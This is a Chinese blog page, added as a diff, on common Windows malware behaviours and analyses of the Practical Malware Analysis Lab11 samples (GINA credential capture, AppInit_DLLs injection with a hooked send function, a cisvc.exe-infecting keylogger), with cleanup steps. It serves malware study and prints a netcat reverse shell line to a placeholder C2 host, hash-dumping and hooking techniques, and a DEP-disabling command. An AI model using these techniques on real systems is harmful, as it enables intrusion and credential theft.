@@ -1,0 +1,973 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="windows病毒分析,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="知识引入下载器和启动器：下载器通常和漏洞利用(exploit)结合在一起，常用API：URLDownloadtoFileA和WinExec。而启动器使用来启动恶意代码的程序 后门backdoor：提供给攻击者远程访问受害主机的通道，功能丰富。  Netcat反向shell：在受害者机器上执行反向主动连接到C2服务器特定端口的命令”nc C2_ip  port -e cmd.exe”，”-e”指定连">
+<meta name="keywords" content="windows病毒分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows恶意代码常见功能">
+<meta property="og:url" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="知识引入下载器和启动器：下载器通常和漏洞利用(exploit)结合在一起，常用API：URLDownloadtoFileA和WinExec。而启动器使用来启动恶意代码的程序 后门backdoor：提供给攻击者远程访问受害主机的通道，功能丰富。  Netcat反向shell：在受害者机器上执行反向主动连接到C2服务器特定端口的命令”nc C2_ip  port -e cmd.exe”，”-e”指定连">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1572851806636.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1572852500417.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1572852878780.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1572853946362.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1572854664793.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1572855811938.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1572855916756.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1572857822691.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1572920783493.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1572921138468.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1572921956610.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573095043038.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573100377662.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573101708497.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573101747544.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573102365675.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573102562911.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573181732472.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573185511695.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573199440592.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573199648992.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573199962630.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573206940849.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573207046460.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573203913117.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573206428734.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573206224027.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573206281883.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1573206371627.png">
+<meta property="og:updated_time" content="2019-11-08T10:29:24.975Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows恶意代码常见功能">
+<meta name="twitter:description" content="知识引入下载器和启动器：下载器通常和漏洞利用(exploit)结合在一起，常用API：URLDownloadtoFileA和WinExec。而启动器使用来启动恶意代码的程序 后门backdoor：提供给攻击者远程访问受害主机的通道，功能丰富。  Netcat反向shell：在受害者机器上执行反向主动连接到C2服务器特定端口的命令”nc C2_ip  port -e cmd.exe”，”-e”指定连">
+<meta name="twitter:image" content="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/1572851806636.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/">
+
+
+
+
+
+  <title>Windows恶意代码常见功能 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/30/Windows恶意代码常见功能/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Windows恶意代码常见功能</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T14:27:50+08:00">
+                2019-10-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="知识引入"><a href="#知识引入" class="headerlink" title="知识引入"></a>知识引入</h1><p><strong>下载器和启动器：</strong>下载器通常和漏洞利用(exploit)结合在一起，常用API：URLDownloadtoFileA和WinExec。而启动器使用来启动恶意代码的程序</p>
+<p><strong>后门backdoor：</strong>提供给攻击者远程访问受害主机的通道，功能丰富。</p>
+<ul>
+<li><p>Netcat反向shell：在受害者机器上执行反向主动连接到C2服务器特定端口的命令”nc C2_ip  port -e cmd.exe”，”-e”指定连接建立后运行的成程序并且该程序的标准输入和输出都会被绑定在套接字上</p>
+</li>
+<li><p>Windows反向shell：前面说过，使用CreateProcess来创建cmd.exe程序的进程，并将标准输入、输出、错误流都绑定到和远程C2服务器建立连接的套接字上。</p>
+<p>还有一种方法涉及一个套接字、两个管道、两个线程，用来加解密传输过程中的数据，后面文章详细解释</p>
+</li>
+</ul>
+<p><strong>远程控制工具RAT：</strong>远程管理一台或者多台计算机，存在丰富交互行为</p>
+<p><strong>僵尸网络：</strong>被感染主机的集合。有单一控制服务器来控制，数量级别比较大，不存在复杂交互，并且同一时间被控制</p>
+<p><strong>登陆凭证窃密器：</strong></p>
+<ul>
+<li><p>(XP)GINA拦截：微软图形识别与登陆验证界面，允许第三方添加一些代码来自定义登陆过程。Gina在msgina.dll中实现，这个DLL在用户登录过程中由Winlogon可执行文件加载，恶意代码可以修改注册表项”Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL”来在Winlogon加载msgina.dll之前加载恶意第三方DLL实现类似中间人的角色，由于要拦截对gina的请求，需要实现msgina.dll的导出接口，导出很多Wlx开头的15+函数</p>
+</li>
+<li><p>口令HASH转储：通过抓取登陆凭证HASH来进行暴力破解或者Pass-the-Hash工具（没有明文的情况下通过LM或者NTLM哈希来通过远程主机的验证来获取访问权限）。pwdump通过注入DLL到lsass.exe中来获取权限访问更多API来获取哈希。导入”samsrv.dll”和”advapi.dll”访问SAM和获取没被lsass.exe导入的函数。SamIConnect链接SAM，SamQueryInformationUser来提取hash，SystemFunction025和SystemFunction027用来解密哈希</p>
+</li>
+<li><p>键盘记录：有内核层(Rootkit)和用户层的记录器。用户层通常使用SetWindowsHookEx安装挂钩或者轮询使用GetAsyncKeyState(识别一个按键是否被按下)、GetForegroundWindow(识别但钱聚焦的前端窗口)检查按键状态</p>
+<p><strong>主机驻留：</strong></p>
+</li>
+<li><p>修改注册表：自启动注册表、svchost DLL</p>
+</li>
+<li><p>感染系统二进制文件。插入恶意代码到新建的空节中</p>
+</li>
+<li><p>DLL顺序加载劫持：非KnowDLL保护的DLL程序加载要安装顺序加载从加载应用程序的目录到当前目录再到系统目录以及之后的目录这个次序开始寻找和加载。我们利用这种顺序加载，将恶意DLL放在前面的目录就行</p>
+</li>
+</ul>
+<p><strong>提权：</strong>用户即使是管理员权限也没有任意访问系统一切资源的权限，例如在远程进程中调用TerminateProcess、CreateRemoteThread函数。所以我们需要提升权限，途径是：通过调用AdjustTokenPrivilege来调整进程的访问令牌来提升权限到SeDebugPrivilege，默认只能赋给管理员。</p>
+<ul>
+<li>实现过程：OpenProcessToken来获取进程访问令牌，GetCurrentProcess获取进程句柄，将句柄以及期望获取的权限作为参数传给LookupPrivilegeValueA，获取本地唯一标识符LUID，标识特定权限。接着将访问令牌和LUID传给AdjustTokenPrivileges来调整权限</li>
+</ul>
+<p><strong>用户态Rootkit：</strong>在用户态通过Hook技术来隐藏恶意代码的进程和痕迹</p>
+<ul>
+<li><p>IAT Hook：修改导入地址表IAT或者导出地址表EAT</p>
+</li>
+<li><p>Inline Hook：修改代码指令，覆盖被Hook函数开始的几个指令为跳转到恶意代码出的跳转指令</p>
+<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1></li>
+</ul>
+<p>通过练习样本接触常见恶意代码类型。</p>
+<p>通过Lab11-01的样本学习:</p>
+<ul>
+<li>XP系统上修改注册表拦截GINA来获取用户登录信息</li>
+</ul>
+<p>通过Lab11-02的样本学习:</p>
+<ul>
+<li>AppInit_DLLs和LoadAppInit_DLLs引起的恶意DLL注入</li>
+<li>Inline-Hook实现的添加窃取邮件数据</li>
+</ul>
+<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><ol>
+<li>基础静态分析</li>
+<li>高级静态动态结合分析</li>
+</ol>
+<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h2><h3 id="基础静态分析"><a href="#基础静态分析" class="headerlink" title="基础静态分析"></a>基础静态分析</h3><p><strong>Lab11-01.exe</strong></p>
+<ul>
+<li>加载资源</li>
+<li>修改注册表，可能用来劫持msgina.dll来获取登陆凭证</li>
+</ul>
+<pre><code>导入函数：
+LoadResource
+RegSetValueExA
+
+资源节中存在PE文件
+
+字符串：
+msutil32.sys
+Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+WlxInitialize
+WlxRemoveStatusMessage
+WlxShutdown
+MSGina.dll
+...</code></pre><p><strong>资源PE(DLL)文件</strong></p>
+<p>修改注册表，但这个已经是恶意的劫持模块了，所以暂时不能分析具体行为，我们结合高级分析技术来断定</p>
+<pre><code>导入函数：
+RegSetValueExW
+
+导出函数：
+WlxInitialize
+WlxLogoff
+...
+
+字符串：
+Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+msutil32.sys
+MSGina.dll</code></pre><h3 id="高级静态动态结合分析"><a href="#高级静态动态结合分析" class="headerlink" title="高级静态动态结合分析"></a>高级静态动态结合分析</h3><h4 id="Lab11-01-exe"><a href="#Lab11-01-exe" class="headerlink" title="Lab11-01.exe"></a>Lab11-01.exe</h4><p>将资源文件写入到”msgina32.dll”文件</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1572851806636.png" alt="1572851806636"></p>
+<p>传入参数”C:\Users\15pb-win7\Desktop\msgina32.dll”作为注册表项”HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon”的”GinaDll”键值项的值。下面if语句是一旦成功就执行else，失败返回1</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1572852500417.png" alt="1572852500417"></p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1572852878780.png" alt="1572852878780"></p>
+<h4 id="资源PE文件"><a href="#资源PE文件" class="headerlink" title="资源PE文件"></a>资源PE文件</h4><p>加载DLL文件”c:\windows\system32\MSGina”，并获取相应句柄作为全局变量。在大部分导出函数中一旦调用相应API，该恶意DLL就会通过该句柄来调用原始文件MSGina来处理请求。</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1572853946362.png" alt="1572853946362"></p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1572854664793.png" alt="1572854664793"></p>
+<p>存在个别例外函数来执行恶意行为，例如：WlxLoggedOutSAS，在注销用户时将用户登录凭证保存到msutil32.sys文件中</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1572855811938.png" alt="1572855811938"></p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1572855916756.png" alt="1572855916756"></p>
+<p>在DLL注册和注销的时候，修改注册表再将”Software\Microsoft\Windows NT\CurrentVersion\Winlogon”的键值”GinaDLL”为系统原始的msgina.dll文件</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1572857822691.png" alt="1572857822691"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><strong>Lab11-01.exe文件的主机行为：</strong></p>
+<ul>
+<li>添加注册表键：”HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDll”</li>
+</ul>
+<p>Lab11-01.exe的资源文件主机行为：</p>
+<ul>
+<li>将登陆信息存储到”msutil32.sys”文件中</li>
+</ul>
+<p><strong>清理病毒：</strong></p>
+<ul>
+<li>删除”HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDll”注册表键值</li>
+<li>删除”msutil32.sys”文件</li>
+</ul>
+<h2 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h2><p>Lab11-02.dll</p>
+<p>Lab11-02.ini</p>
+<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><ul>
+<li>遍历线程</li>
+<li>修改注册表”SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows”的键值”AppInit_DLLs”指定的DLL文件会让所有加载user32.dll的进程都会加载恶意代码</li>
+</ul>
+<p>未能明显显示出</p>
+<pre><code>导入函数：
+RegSetValueExA
+Thread32Next
+Thread32First
+
+导出函数：
+installer
+
+字符串：
+send
+THEBAT.EXE
+OUTLOOK.EXE
+MSIMN.EXE
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
+AppInit_DLLs
+\Lab11-02.ini
+spoolvxx32.dll</code></pre><h3 id="高级静态动态结合分析-1"><a href="#高级静态动态结合分析-1" class="headerlink" title="高级静态动态结合分析"></a>高级静态动态结合分析</h3><p>首先分析DLL文件的DllMain函数</p>
+<p>读取”C:\Windows\system32\Lab11-02.ini”文件到全局变量byte_100034A0</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1572920783493.png" alt="1572920783493"></p>
+<p>动态解密Lab11-02.ini文件的内容: <a href="mailto:billy@malwareanalysisbook.com" target="_blank" rel="noopener">billy@malwareanalysisbook.com</a></p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1572921138468.png" alt="1572921138468"></p>
+<p>获取当前进程的文件路径并截取文件名。如果满足：文件名等于THEBAT.EXE，或者等于 OUTLOOK.EXE，或者等于MSIMN.EXE就可以继续执行，否则返回退出，也就是说下面函数中过的行为是针对这三个进程的，下面看针对这些进程会有什么操作</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1572921956610.png" alt="1572921956610"></p>
+<p>第一个函数：遍历线程，将所有非恶意DLL的线程都挂起</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573095043038.png" alt></p>
+<p>第二个函数：Inline Hook send函数。</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573100377662.png" alt="1573100377662"></p>
+<p>Hook send函数后解析数据包，拦截包含SMTP协议的数据包，将收件人改成 <a href="mailto:billy@malwareanalysisbook.com" target="_blank" rel="noopener">billy@malwareanalysisbook.com</a>，然后跳转回被Hook的函数</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573101708497.png" alt="1573101708497"></p>
+<p>第三个函数：遍历线程将所有非当前线程的线程都恢复</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573101747544.png" alt="1573101747544"></p>
+<p>到这里我们DllMain函数分析完毕，主要行为就是:</p>
+<ul>
+<li>解密C:\Windows\system32\Lab11-02.ini文件中的email地址</li>
+<li>hook send函数，拦截THEBAT.EXE、 OUTLOOK.EXE、MSIMN.EXE进程的SMTP协议的邮件数据包，将邮件收件人改成刚解密的C2地址</li>
+</ul>
+<p>下面开始分析导出函数installer：修改注册表键值”SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs”为”spoolvxx32.dll”，接着将恶意DLL复制为系统目录下的”spoolvxx32.dll”，实现所有导入user32.dll进程的恶意DLL注入</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573102365675.png" alt="1573102365675"></p>
+<p>使用命令行调用”rundll32.exe Lab11-02.dll installer”运行DLL的导出函数，但是如果重启机器会发现DLL并没有被注入到所有加载user32.dll的进程中，还需要我们手动来讲注册表项<strong>LoadAppInit_DLLs</strong>置1，重启之后才可以成功DLL注入</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573102562911.png" alt="1573102562911"></p>
+<p>在虚拟机中搭建好outlook2013客户端，配置好账户信息后，随便发送一条信息，用wireswhark抓包可以捕获到我们的邮件接收人多了一位<a href="mailto:billy@malwareanalysisbook.com" target="_blank" rel="noopener">billy@malwareanalysisbook.com</a>，恶意DLL注入成功，这里需要拍我们在配置OUTLOOK客户端的时候将发送服务器(SMTP)端口设置为25才可以，而不是QQ邮件官方教程中的465端口</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573181732472.png" alt="1573181732472"></p>
+<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>该样本主要行为是通过修改AppInit_DLLs注册表键值来进行恶意DLL注入，再结合Inline-Hook send函数来拦截SMTP协议的邮件数据包，添加邮件接收人来进行信息窃取</p>
+<p><strong>清除病毒：</strong></p>
+<ul>
+<li><p>删除”C:\Windows\system32\Lab11-02.ini”</p>
+</li>
+<li><p>删除”spoolvxx32.dll”</p>
+</li>
+<li><p>清除注册表项键值AppInit_DLLs中的spoolvxx32.dll，重新启动</p>
+</li>
+<li><p>将注册表键值LoadAppInit_DLLs置0</p>
+</li>
+</ul>
+<h2 id="实例3"><a href="#实例3" class="headerlink" title="实例3"></a>实例3</h2><p>Lab11-03.exe</p>
+<p>Lab11-03.dll</p>
+<h3 id="基础静态分析-1"><a href="#基础静态分析-1" class="headerlink" title="基础静态分析"></a>基础静态分析</h3><h4 id="Lab11-03-exe"><a href="#Lab11-03-exe" class="headerlink" title="Lab11-03.exe"></a>Lab11-03.exe</h4><ul>
+<li>文件操作，对特定后缀”.com、.exe、.bat、.cmd”文件的操作</li>
+<li>启动服务cisvc</li>
+<li>涉及”command.com”的网络行为</li>
+</ul>
+<pre><code>导入函数：
+MapViewOfFile
+CreateFileMappingA
+CopyFileA
+
+字符串：
+cmd.exe
+command.com
+.com
+.exe
+.bat
+.cmd
+C:\WINDOWS\System32\inet_epar32.dll
+net start cisvc
+C:\WINDOWS\System32\%s
+cisvc.exe
+Lab11-03.dll</code></pre><h4 id="Lab11-03-dll"><a href="#Lab11-03-dll" class="headerlink" title="Lab11-03.dll"></a>Lab11-03.dll</h4><ul>
+<li>互斥体</li>
+<li>伪装系统DLL的kernel64x.dll</li>
+<li>键盘记录</li>
+</ul>
+<pre><code>导入函数：
+OpenMutexA
+GetForegroundWindow
+GetAsyncKeyState
+
+导出函数：
+zzz69806582
+
+字符串：
+C:\WINDOWS\System32\kernel64x.dll
+user32.dll
+Lab1103dll.dll
+&lt;SHIFT&gt; </code></pre><h3 id="高级静态动态结合分析-2"><a href="#高级静态动态结合分析-2" class="headerlink" title="高级静态动态结合分析"></a>高级静态动态结合分析</h3><p>先看Lab11-03.exe文件。主要分为3步：</p>
+<ol>
+<li>将同目录下的”Lab11-03.dll”复制到”C:\WINDOWS\System32\inet_epar32.dll”</li>
+<li>“C:\WINDOWS\System32\cisvc.exe”字符串传入sub_401070</li>
+<li>开启服务cisvc</li>
+</ol>
+<p>下面主要看sub_401070的行为</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573185511695.png" alt="1573185511695"></p>
+<p>解析”C:\WINDOWS\System32\cisvc.exe”文件并且修改.text段的数据，我们下面动态跟踪</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573199440592.png" alt="1573199440592"></p>
+<p>由于是将409030处的数据写入.text段，所以判定是一段shellcode，反汇编后是对应的代码</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573199648992.png" alt="1573199648992"></p>
+<p>但是硬读汇编也不太好理解，我们这里看能不能从shellcode里找到什么有用的字符串来帮助分析.</p>
+<p>我们可以看到下面这两个字符串，可以判断这个shellcode的功能就是启用这个DLL文件的导出函数</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573199962630.png" alt="1573199962630"></p>
+<p>这里我们可以动态跟踪这个被修改后的cisvc.exe文件，在shellcode里加载恶意DLL</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573206940849.png" alt="1573206940849"></p>
+<p>调用导出函数，最后跳转回原始文件的入口位置</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573207046460.png" alt="1573207046460"></p>
+<p>接着我们看Lab11-03.dll具体有哪些行为，导出函数 zzz69806582 创建线程</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573203913117.png" alt="1573203913117"></p>
+<p>创建互斥量”MZ”,，创建文件C:\WINDOWS\System32\kernel64x.dll</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573206428734.png" alt="1573206428734"></p>
+<p>聚焦当前桌面上的窗口</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573206224027.png" alt="1573206224027"></p>
+<p>遍历每个按键的状态，来记录键盘敲击内容</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573206281883.png" alt="1573206281883"></p>
+<p>最后将内容写回C:\WINDOWS\System32\kernel64x.dll文件中</p>
+<p><img src="/2019/10/30/Windows恶意代码常见功能/1573206371627.png" alt="1573206371627"></p>
+<h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><p>该样本通过修改CISVC.exe文件感染text段，植入shellcode来启动DLL文件并调用导出函数，接着创建线程来键盘记录，由于Win7 32上没有这个服务所以该样本需要在XP上执行</p>
+<p><strong>清除病毒</strong></p>
+<ul>
+<li>删除”C:\WINDOWS\System32\inet_epar32.dll”</li>
+<li>删除CISVC.exe，重新下载干净的CISVC.exe</li>
+<li>删除C:\WINDOWS\System32\kernel64x.dll</li>
+</ul>
+<h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><p><strong>Inline-Hook：</strong>将被Hook函数汇编代码首5字节数据修改成一个jmp指令，跳转到目标地址(jmp的偏移值=目标地址-被hook函数地址-5)，被覆盖的5字节指令需要申请一块可读可写可执行的内存块保存下来并且紧跟一个跳转回被Hook函数的跳转指令</p>
+<p><strong>outlook2013联网崩溃：</strong>一旦连上网络，outlook启动就会崩溃，解决方案很简单关闭DEP，<code>bcdedit /set nx alwaysoff</code>管理员权限命令行执行即可，然后重启机器即可生效</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>【1】<a href="http://blog.chinaunix.net/uid-20761940-id-668884.html" target="_blank" rel="noopener">HOOK API例子</a></p>
+<p>【2】<a href="http://www.atomsec.org/逆向/appinit_dlls注册表方式注入dll/" target="_blank" rel="noopener">appinit_dlls注册表方式注入dll</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/windows病毒分析/" rel="tag"># windows病毒分析</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/24/windows样本高级动态分析四/" rel="next" title="windows样本高级动态分析四之Rootkit篇">
+                <i class="fa fa-chevron-left"></i> windows样本高级动态分析四之Rootkit篇
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/12/隐蔽的恶意代码启动/" rel="prev" title="隐蔽的恶意代码启动">
+                隐蔽的恶意代码启动 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
